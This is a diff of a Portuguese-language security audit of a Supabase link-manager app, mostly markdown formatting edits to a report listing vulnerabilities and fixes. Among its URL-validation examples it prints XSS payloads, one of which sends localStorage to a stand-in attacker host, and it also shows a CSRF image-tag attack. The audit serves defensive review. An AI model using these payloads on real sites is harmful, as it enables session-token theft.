@@ -15,10 +15,12 @@ O projeto WebNest implementa um gerenciador de links com autenticação Supabase
 ## 🚨 VULNERABILIDADES CRÍTICAS
 
 ### 1. **Credenciais de Supabase Expostas no Repositório** ⛔ CRÍTICO
+
 **Arquivo:** `.env`  
 **Severidade:** 🔴 CRÍTICA
 
-#### ❌ Problema Identificado:
+#### ❌ Problema Identificado
+
 ```dotenv
 VITE_SUPABASE_PROJECT_ID="slzspaijayxtyjmrogcm"
 VITE_SUPABASE_PUBLISHABLE_KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
@@ -30,10 +32,12 @@ VITE_SUPABASE_URL="https://slzspaijayxtyjmrogcm.supabase.co"
 - Project ID pode ser usado para identificar seu banco de dados
 - JWT Token Anon Key pode ser usado para acessar dados (dependendo de RLS)
 
-#### ✅ Recomendação:
+#### ✅ Recomendação 1
+
 1. **IMEDIATO**: Revoke a chave atual no painel Supabase
 2. Gerar uma nova chave
 3. Adicionar `.env` ao `.gitignore`:
+
 ```ignore
 # Environment variables
 .env
@@ -41,30 +45,37 @@ VITE_SUPABASE_URL="https://slzspaijayxtyjmrogcm.supabase.co"
 .env.*.local
 .env.prod
 ```
-4. Usar `.env.example` com valores placeholder:
+
+1. Usar `.env.example` com valores placeholder:
+
 ```dotenv
 # Copy from .env.example and fill with your values
 VITE_SUPABASE_PROJECT_ID=
 VITE_SUPABASE_PUBLISHABLE_KEY=
 VITE_SUPABASE_URL=
 ```
-5. Notificar Supabase que a chave foi comprometida
+
+1. Notificar Supabase que a chave foi comprometida
 
 ---
 
 ### 2. **Políticas RLS Inicialmente Abertas a Todos** ⛔ CRÍTICO
+
 **Arquivo:** `supabase/migrations/20260214162247...sql`  
 **Severidade:** 🔴 CRÍTICA
 
-#### ❌ Problema na Primeira Migração:
+#### ❌ Problema na Primeira Migração
+
 ```sql
 -- ❌ INSEGURO - Permite acesso público TOTAL
 CREATE POLICY "Allow all access to links" ON public.links FOR ALL USING (true) WITH CHECK (true);
 CREATE POLICY "Allow all access to categories" ON public.categories FOR ALL USING (true) WITH CHECK (true);
 ```
 
-#### ✅ Status da Segunda Migração:
+#### ✅ Status da Segunda Migração
+
 ✅ A segunda migração corrigiu isso corretamente com RLS baseado em `auth.uid()`:
+
 ```sql
 CREATE POLICY "Users can view their own links"
   ON public.links FOR SELECT
@@ -76,17 +87,21 @@ CREATE POLICY "Users can view their own links"
 ---
 
 ### 3. **Falta de .env no .gitignore** ⛔ CRÍTICO
+
 **Severidade:** 🔴 CRÍTICA
 
 O arquivo `.gitignore` não contém:
+
 ```ignore
 .env            # ← FALTA
 .env.local
 .env.*.local
 ```
 
-#### ✅ Ação Imediata:
+#### ✅ Ação Imediata
+
 Se você já fez commit do `.env`, use:
+
 ```bash
 # Remover do histórico git (⚠️ apenas em dev local)
 git rm --cached .env
@@ -97,11 +112,13 @@ git commit -m "Remove exposed .env file"
 
 ## 🔴 VULNERABILIDADES DE ALTO RISCO
 
-### 4. **Armazenamento de Sessão no localStorage** 
+### 4. **Armazenamento de Sessão no localStorage**
+
 **Arquivo:** `src/integrations/supabase/client.ts`  
 **Severidade:** 🟠 ALTO
 
-#### ❌ Problema:
+#### ❌ Detalhes do Problema
+
 ```typescript
 const supabase = createClient<Database>(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY, {
   auth: {
@@ -116,8 +133,10 @@ const supabase = createClient<Database>(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY, 
 - Se um atacante injetar JavaScript, pode roubar o token
 - Tokens podem ser usados para acessar dados do usuário
 
-#### ✅ Recomendação:
+#### ✅ Recomendação de Mitigação XSS
+
 Use cookies com flag `httpOnly` e `Secure`:
+
 ```typescript
 import { createClient } from '@supabase/supabase-js';
 
@@ -147,12 +166,15 @@ export const supabase = createClient<Database>(SUPABASE_URL, SUPABASE_PUBLISHABL
 
 ---
 
-### 5. **Falta de Validação de URLs Maliciosas** 
+### 5. **Falta de Validação de URLs Maliciosas**
+
 **Arquivo:** `src/lib/validation.ts` e `src/components/LinkCard.tsx`  
 **Severidade:** 🟠 ALTO
 
-#### ❌ Problema:
+#### ❌ Problema de Validação de URL
+
 A validação de URL permite qualquer protocolo http/https:
+
 ```typescript
 url: z.string().url("URL inválida").refine(
   (url) => /^https?:\/\//i.test(url),
@@ -161,13 +183,15 @@ url: z.string().url("URL inválida").refine(
 ```
 
 **Risco:** Usuários podem salvar URLs maliciosas:
+
 - `javascript:alert('XSS')`
 - `data:text/html,<script>alert('XSS')</script>`
 - `javascript:fetch('https://attacker.com?stolen=' + btoa(localStorage))`
 
 Embora haja proteção no LinkCard (`target="_blank" rel="noopener noreferrer"`), não é suficiente.
 
-#### ✅ Recomendação:
+#### ✅ Recomendação de Validação
+
 ```typescript
 import { z } from "zod";
 
@@ -199,18 +223,23 @@ export const linkSchema = z.object({
 
 ---
 
-### 6. **Falta de Content Security Policy (CSP)** 
+### 6. **Falta de Content Security Policy (CSP)**
+
 **Arquivo:** `index.html`  
 **Severidade:** 🟠 ALTO
 
-#### ❌ Problema:
+#### ❌ Problema de Falta de CSP
+
 Não há CSP header definido, deixando a aplicação vulnerável a:
+
 - Injeção de scripts maliciosos
 - Roubo de dados via eventos do navegador
 - Carregamento de recursos não autorizados
 
-#### ✅ Recomendação:
+#### ✅ Mitigação Recomendada
+
 Adicionar a `index.html`:
+
 ```html
 <head>
   <meta charset="UTF-8" />
@@ -238,16 +267,20 @@ Para melhor segurança, usar header HTTP (em vez de meta tag).
 ## 🟠 VULNERABILIDADES DE MÉDIO RISCO
 
 ### 7. **Falta de CSRF Protection**
+
 **Severidade:** 🟡 MÉDIO
 
-#### ❌ Problema:
+#### ❌ Detalhes do Problema de CSRF
+
 Sem headers CSRF, um site malicioso poderia:
+
 ```html
 <!-- Em site-malicioso.com -->
 <img src="https://seu-app.com/api/delete-link?id=123" >
 ```
 
-#### ✅ Recomendação:
+#### ✅ Recomendação de Proteção CSRF
+
 - Usar SameSite cookies
 - Implementar CSRF tokens para formulários
 - Supabase gerencia alguns aspectos, mas adicionar camada extra:
@@ -271,10 +304,12 @@ defineConfig({
 ---
 
 ### 8. **Favicon URLs de Terceiros sem Validação**
+
 **Arquivo:** `src/components/LinkCard.tsx` e `src/components/LinkForm.tsx`  
 **Severidade:** 🟡 MÉDIO
 
-#### ❌ Problema:
+#### ❌ Problema de Favicon Tracking
+
 ```typescript
 // LinkForm.tsx
 const hostname = new URL(url).hostname;
@@ -284,7 +319,8 @@ setFavicon(`https://www.google.com/s2/favicons?domain=${hostname}&sz=32`);
 - Google pode rastrear cada favicon requisitado
 - Favicon URL pode ser explorado se não for validado
 
-#### ✅ Recomendação:
+#### ✅ Alternativas de Mitigação
+
 ```typescript
 // Usar alternativa mais privada
 const hostname = new URL(url).hostname;
@@ -300,10 +336,12 @@ const faviconUrl = `https://icon.horse/icon/${hostname}`;
 ---
 
 ### 9. **Falta de Validação de Upload de Arquivo (Import)**
+
 **Arquivo:** `src/pages/Index.tsx`  
 **Severidade:** 🟡 MÉDIO
 
-#### ❌ Problema:
+#### ❌ Problema
+
 ```typescript
 const handleImport = () => {
   const input = document.createElement("input");
@@ -325,7 +363,8 @@ const handleImport = () => {
 - Sem validação de estrutura antes de processar
 - Poderia causar DoS com arquivo gigante
 
-#### ✅ Recomendação:
+#### ✅ Recomendação
+
 ```typescript
 const handleImport = () => {
   const input = document.createElement("input");
@@ -387,6 +426,7 @@ const handleImport = () => {
 ## 🟢 PONTOS POSITIVOS ENCONTRADOS ✅
 
 ### 10. **RLS Corretamente Implementado na Migração Final** ✅
+
 ```sql
 CREATE POLICY "Users can view their own links"
   ON public.links FOR SELECT
@@ -398,6 +438,7 @@ CREATE POLICY "Users can view their own links"
 ---
 
 ### 11. **Validação de Input com Zod** ✅
+
 ```typescript
 export const linkSchema = z.object({
   url: z.string().url("URL inválida").max(2048, "..."),
@@ -411,6 +452,7 @@ export const linkSchema = z.object({
 ---
 
 ### 12. **Proteção de Links Externos** ✅
+
 ```typescript
 <a
   href={link.url}
@@ -425,11 +467,13 @@ export const linkSchema = z.object({
 ---
 
 ### 13. **Sem `dangerouslySetInnerHTML`** ✅
+
 O projeto não usa `dangerouslySetInnerHTML` ou `innerHTML`, prevenindo injeção de HTML/XSS direto no DOM.
 
 ---
 
 ### 14. **TypeScript** ✅
+
 Uso de TypeScript adiciona uma camada de type safety que previne certas classes de bugs.
 
 ---
@@ -437,7 +481,7 @@ Uso de TypeScript adiciona uma camada de type safety que previne certas classes 
 ## 📊 Tabela de Resumo de Vulnerabilidades
 
 | # | Tipo | Severidade | Status | Ação |
-|---|------|-----------|--------|------|
+| --- | ------ | ----------- | -------- | ------ |
 | 1 | Credenciais Expostas | 🔴 CRÍTICA | ❌ Ativo | Revoke chave + Add .env ao gitignore |
 | 2 | RLS Aberto (1ª Migração) | 🔴 CRÍTICA | ⚠️ Parcial | Verificar se 2ª migração foi aplicada |
 | 3 | .env no Repositório | 🔴 CRÍTICA | ❌ Ativo | Remove git history + adicionar gitignore |
@@ -453,6 +497,7 @@ Uso de TypeScript adiciona uma camada de type safety que previne certas classes 
 ## 🚀 Plano de Ação Corretivo
 
 ### 🔴 Fase 1: CRÍTICA (Hoje - 24 horas)
+
 - [ ] Revogar chaves Supabase atuais no console
 - [ ] Gerar novas chaves
 - [ ] Remover `.env` do git history
@@ -460,12 +505,14 @@ Uso de TypeScript adiciona uma camada de type safety que previne certas classes 
 - [ ] Fazer novo commit
 
 ### 🟠 Fase 2: ALTO RISCO (Próximos 3 dias)
+
 - [ ] Implementar CSP headers
 - [ ] Adicionar validação de URLs maliciosas
 - [ ] Migrar para PKCE flow
 - [ ] Adicionar validação de upload de arquivo
 
 ### 🟡 Fase 3: MÉDIO RISCO (Próxima semana)
+
 - [ ] Implementar CSRF protection
 - [ ] Melhorar privacidade de favicon
 - [ ] Adicionar logging e monitoramento de segurança
